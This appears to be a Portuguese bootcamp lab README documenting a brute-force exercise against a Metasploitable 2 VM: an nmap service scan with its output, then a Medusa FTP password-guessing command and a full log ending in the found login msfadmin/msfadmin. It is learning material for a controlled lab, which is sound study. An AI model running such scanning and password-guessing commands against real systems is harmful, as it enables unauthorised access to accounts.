# bruteforce-lab DIO.ME BOOTCAMPRIACHUELO

## 🎯 Objetivo

Simular ataques de força bruta em ambiente controlado para estudo de vulnerabilidades e mitigação.

## 🖥️ Ambiente

Kali Linux (atacante)

Metasploitable 2 (alvo)

Rede Host-only

## 🔎 Enumeração

Comando:
```nmap -sV -p 21,22,80,445,139 192.168.56.101``` | 21,22,80,445,139 se refere as portas que quero acessar verificar | 192.168.56.101 se refere ao ip do Metasploitble2
Resultado: ```Nmap scan report for 192.168.56.101
Host is up (0.0044s latency).
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: ********** (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel ```
## 💥 Ataque FTP

Comando: ```medusa -h IP -U usuarios.txt -P senhas.txt -M ftp -t 6```

Resultado: 
```
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: msfadmin (1 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (2 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (3 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 12345678 (4 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (6 of 6 complete)
2026-02-24 08:59:28 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: msfadmin (1 of 6 complete)
2026-02-24 08:59:28 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: password (2 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 123456 (3 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: abc123 (4 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (5 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: 12345678 (6 of 6 complete)
2026-02-24 08:59:35 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: password (1 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: msfadmin (2 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 12345678 (3 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (4 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: qwerty (6 of 6 complete)
2026-02-24 08:59:44 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: password (1 of 6 complete)
2026-02-24 08:59:51 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: msfadmin (2 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 123456 (3 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: 12345678 (4 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: abc123 (5 of 6 complete)
2026-02-24 08:59:52 ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 4 complete) Password: qwerty (6 of 6 complete)
```
Validação:
``` 2026-02-24 08:59:28 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS] ```
